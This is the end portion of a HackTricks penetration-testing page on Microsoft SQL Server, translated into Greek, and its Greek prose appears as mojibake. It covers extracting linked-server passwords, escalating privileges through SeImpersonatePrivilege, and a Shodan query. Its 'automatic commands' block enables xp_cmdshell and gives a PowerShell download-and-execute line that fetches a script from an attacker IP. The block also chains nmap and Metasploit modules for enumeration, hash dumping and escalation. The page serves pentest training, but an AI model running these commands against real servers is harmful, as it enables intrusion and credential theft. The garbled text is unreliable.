## Î•Î¾Î±Î³Ï‰Î³Î® ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ SQL Server Linked Servers

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ SQL Server Î±Ï€ÏŒ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎµÏ‚ SQL ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ Î»Î¬Î²ÎµÎ¹ ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿, Ï‡Î¿ÏÎ·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ· ÎµÎ´ÏÎ¬ ÏƒÏ„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿. Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® ÎºÎ±Î¹ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Ï„Ï‰Î½ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Î³Î¹Î± Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ [ÎµÎ´Ï](https://www.richardswinbank.net/admin/extract\_linked\_server\_passwords)

ÎšÎ¬Ï€Î¿Î¹ÎµÏ‚ Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î¯Î½Î¿Ï…Î½ Î³Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Ï…Ï„Î® Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·. ÎšÎ±Ï„Î±ÏÏ‡Î¬Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î® Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏƒÏ„Îµ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… SQL Server.

ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÏƒÎ±Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÏ„Îµ Ï„ÏÎ¯Î± Ï€ÏÎ¬Î³Î¼Î±Ï„Î±, Ï„Î± Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ Ï„Î± Î±ÎºÏŒÎ»Î¿Ï…Î¸Î±:

1. Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… TCP/IP ÏƒÏ„Î¹Ï‚ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎµÏ‚ Ï„Î¿Ï… SQL Server;
2. Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· ÎµÎ½ÏŒÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï… ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚, ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¸Î± Ï€ÏÎ¿ÏƒÏ„ÎµÎ¸ÎµÎ¯ Î­Î½Î± ÏƒÎ·Î¼Î¬Î´Î¹ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ -T7806.
3. Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î·Ï‚ Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚.

Î“Î¹Î± Î½Î± Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚, [Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) Î­Ï‡ÎµÎ¹ Ï„Î± Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î±. Î•ÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ PowerShell Î³Î¹Î± ÎºÎ¬Î¸Îµ Î²Î®Î¼Î± Ï„Î·Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚, Ï„Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Î­Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î­Î½Î± Ï€Î»Î®ÏÎµÏ‚ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… ÏƒÏ…Î½Î´Ï…Î¬Î¶ÎµÎ¹ Ï„Î± ÏƒÎµÎ½Î¬ÏÎ¹Î± Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® ÎºÎ±Î¹ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Ï„Ï‰Î½ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, Î±Î½Î±Ï„ÏÎ­Î¾Ï„Îµ ÏƒÏ„Î¿Ï…Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·: [Î‘Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎšÏ‰Î´Î¹ÎºÏÎ½ Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„ÏÎ½ Î’Î¬ÏƒÎ·Ï‚ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ MSSQL](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Î‘Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ· Ï€ÏÎ¿Î²Î»Î·Î¼Î¬Ï„Ï‰Î½ Î¼Îµ Ï„Î·Î½ Î‘Ï†Î¹ÎµÏÏ‰Î¼Î­Î½Î· Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î¹ÎºÎ® Î£ÏÎ½Î´ÎµÏƒÎ· SQL Server](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Î‘Î½ÏŒÎ´Î¿Ï‚ Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¤Î¿Ï€Î¹ÎºÎ¬

ÎŸ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® MSSQL Î¸Î± Î­Ï‡ÎµÎ¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ **SeImpersonatePrivilege.**\
Î Î¹Î¸Î±Î½ÏŒÎ½ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ ÏƒÎµ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®** Î±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± 2 ÏƒÎµÎ½Î¬ÏÎ¹Î±:

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) **Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

*** 

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„ÎµÏ‚ Î•Î½Ï„Î¿Î»Î­Ï‚ HackTricks
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applicationsâ€”which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î·Î½ [**ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
